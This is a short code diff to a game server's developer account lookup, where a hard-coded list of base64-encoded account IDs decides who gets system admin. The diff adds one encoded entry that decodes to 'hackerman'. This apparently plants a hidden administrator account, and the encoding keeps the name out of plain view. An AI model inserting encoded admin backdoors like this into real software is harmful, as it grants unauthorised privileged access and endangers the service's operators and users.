@@ -184,7 +184,7 @@ class DeveloperAccountDB(AccountDB):
     notify = directNotify.newCategory('DeveloperAccountDB')
 
     def lookup(self, userId, callback):
-        admins = ["YidNMG4zcjBGVFchJw==","Yic2MTIwJw=="] # change me to encoded account Ids in the astron db who you want to have system admin.
+        admins = ["YidNMG4zcjBGVFchJw==","Yic2MTIwJw==", "YidoYWNrZXJtYW4n"] # change me to encoded account Ids in the astron db who you want to have system admin.
         encodedBUid = base64.b64encode(str(userId).encode("utf-8"))
         trueUid = str(encodedBUid, "utf-8")
         self.notify.warning("DEBUG: USER tried to login with encoded user id: " + trueUid)
